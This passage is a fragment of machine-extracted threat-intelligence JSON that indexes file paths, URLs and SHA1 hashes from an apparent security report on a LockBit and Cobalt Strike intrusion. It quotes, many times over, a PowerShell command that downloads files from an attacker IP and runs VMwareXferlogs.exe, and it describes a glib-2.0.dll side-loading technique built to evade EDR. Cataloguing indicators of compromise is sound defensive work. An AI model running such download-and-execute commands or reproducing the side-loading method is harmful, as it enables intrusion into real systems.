            }
        ],
        "Path": [
            {
                "token": {
                    "id": "<PATH_0x40a8dd40>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\glib-2.0.dll;"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<PATH_0x1f36c135>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\c0000015.log;"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<PATH_0x95aa446f>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<PATH_0x9cbc3e27>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                },
                "references": {
                    "sentences": [
                        "c:\\windows\\debug\\VMwareXferlogs.exe 1><crlf>\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1"
                    ],
                    "titles": [
                        "Attack Chain",
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x4b1ae79>",
                            "type": "UnknownWord",
                            "value": "1>"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<PATH_0xc61a500b>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\glib-2.0.dll"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<PATH_0xe0fbddbf>",
                    "type": "Path",
                    "value": "c:\\windows\\debug\\c0000015.log"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    }
                ]
            }
        ],
        "Url": [
            {
                "token": {
                    "id": "<URL_0xb9535c54>",
                    "type": "Url",
                    "value": "http://45.32.108.54:443/glib-2.0.dll"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<URL_0xfa8a332e>",
                    "type": "Url",
                    "value": "http://45.32.108.54:443/c0000015.log"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<URL_0x38d0223e>",
                    "type": "Url",
                    "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x69e2e8a>",
                            "type": "UnknownWord",
                            "value": "-uri"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeaba6949>",
                            "type": "UnknownWord",
                            "value": "invoke-webrequest"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    }
                ]
            }
        ],
        "Hash": [
            {
                "token": {
                    "id": "<SHA1_0x1b511e51>",
                    "type": "Hash",
                    "hash_type": "SHA1",
                    "value": "091b490500b5f827cc8cde41c9a7f68174d11302"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<SHA1_0x1b511e51>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "091b490500b5f827cc8cde41c9a7f68174d11302"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<SHA1_0x1b511e51>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "091b490500b5f827cc8cde41c9a7f68174d11302"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<HASHSET_0xb92096a4>",
                    "type": "HashSet",
                    "value": [
                        {
                            "id": "<SHA1_0x3df376a9>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                        },
                        {
                            "id": "<FILE_0x76a33ffb>",
                            "type": "File",
                            "value": "glib-2.0.dll"
                        }
                    ]
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations.",
                        "glib-2.0.dll functions being called by VMwareXferlog.exe",
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                        "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Exported functions of malicious glib-2.0.dll"
                    ],
                    "titles": [
                        "Conclusion",
                        "Attack Chain",
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7062c79d>",
                            "type": "UnknownWord",
                            "value": "party"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eb30b3e>",
                            "type": "UnknownWord",
                            "value": "exitprocess"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x740f4a89>",
                            "type": "UnknownWord",
                            "value": "completing"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3efc9ad7>",
                            "type": "UnknownWord",
                            "value": "g_path_get_basename"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7a672a58>",
                            "type": "UnknownWord",
                            "value": "shipped"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x41cfb030>",
                            "type": "UnknownWord",
                            "value": "imported"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
